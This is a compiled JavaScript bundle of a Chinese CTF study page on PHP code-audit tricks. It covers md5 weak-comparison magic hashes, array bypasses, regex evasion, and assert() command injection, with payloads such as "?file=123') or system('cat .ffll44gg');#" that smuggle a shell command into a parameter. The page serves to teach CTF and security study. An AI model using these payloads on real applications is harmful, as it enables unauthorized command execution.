(window.webpackJsonp=window.webpackJsonp||[]).push([[51],{507:function(s,a,n){"use strict";n.r(a);var e=n(2),t=Object(e.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"php代码"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#php代码"}},[s._v("#")]),s._v(" php代码")]),s._v(" "),a("h4",{attrs:{id:"_1-hash加密相关"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-hash加密相关"}},[s._v("#")]),s._v(" "),a("strong",[s._v("1.hash加密相关：")])]),s._v(" "),a("p",[s._v("PHP弱类型hash比较典型代码：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("if(md5($a) == md5($b)) {    //注意两个等号“==”\n    echo $flag;\n}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("漏洞的原理如下：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("== 在进行比较的时候，会先将两边的变量类型转化成相同的，再进行比较。\n0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("以下是一些md5加密后开头为0e的字符串：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("QNKCDZO\n0e830400451993494058024219903391\n\ns878926199a\n0e545993274517709034328855841020\n  \ns155964671a\n0e342768416822451524974117254469\n  \ns214587387a\n0e848240448830537924465865611904\n  \ns214587387a\n0e848240448830537924465865611904\n  \ns878926199a\n0e545993274517709034328855841020\n  \ns1091221200a\n0e940624217856561557816327384675\n  \ns1885207154a\n0e509367213418206700842008763514\n\naabg7XSs\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br")])]),a("p",[s._v("另外，这个也可以用数组绕过，这个方法在下面会详细说。")]),s._v(" "),a("h4",{attrs:{id:"_2-数组返回null绕过"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-数组返回null绕过"}},[s._v("#")]),s._v(" "),a("strong",[s._v("2.数组返回NULL绕过")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("if(md5($a) === md5($b)) {       //两个等号变成三个，三个===不会进行类型转换\n    echo $flag;\n}\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("那么利用弱类型hash比较缺陷将无法绕过，这时可以使用数组绕过。")]),s._v(" "),a("p",[s._v("传入"),a("code",[s._v("?a[]=1&b[]=2")]),s._v("就可以成功绕过判断。")]),s._v(" "),a("h4",{attrs:{id:"_3-正则表达式相关"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-正则表达式相关"}},[s._v("#")]),s._v(" "),a("strong",[s._v("3.正则表达式相关")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("<?php\n    $p = $_GET['p'];\n    if (preg_match('/[0-9a-zA-Z]{2}/',$p) === 1) {\n        echo 'False';\n    } else {\n        $pp = trim(base64_decode($p));\n        if ($pp === 'flag.php') {\n            echo 'success';\n        }\n    }\n?>\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br")])]),a("p",[s._v("单引号绕过preg_match()正则匹配：")]),s._v(" "),a("p",[s._v("在每一个字符前加上单引号可以绕过preg_match的匹配")]),s._v(" "),a("p",[s._v("Bugku ereg正则%00截断："),a("a",{attrs:{href:"https://blog.csdn.net/weixin_44953600/article/details/108855995",target:"_blank",rel:"noopener noreferrer"}},[s._v("Bugku web — ereg正则%00截断(代码审计) ——详细题解_%00截断正则匹配-CSDN博客"),a("OutboundLink")],1)]),s._v(" "),a("h4",{attrs:{id:"_4-命令执行漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_4-命令执行漏洞"}},[s._v("#")]),s._v(" "),a("strong",[s._v("4.命令执行漏洞")]),s._v("：")]),s._v(" "),a("p",[s._v("assert()函数引起的命令执行:assert函数的参数为字符串时，会将字符串当做PHP命令来执行")]),s._v(" "),a("p",[s._v("例如：assert(‘phpinfo()’)相当于执行<?php phpinfo() ?>")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("<?php\nerror_reporting(0);\nif (isset($_GET['file'])) {\n    if($_GET['file'] === \"flag\"){\n        highlight_file(\"flag.php\");\n    }else{\n        $page = $_GET['file'];\n    }\n} else {\n    $page = \"./flag.php\";\n}\n\nassert(\"file_exists('$page')\");\n?>\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br")])]),a("p",[s._v("payload：")]),s._v(" "),a("p",[a("code",[s._v("?file=123’) or system(‘ls -a’);#")]),s._v(" "),a("code",[s._v("?file=123’) or system(‘cat .ffll44gg’);#")])])])}),[],!1,null,null,null);a.default=t.exports}}]);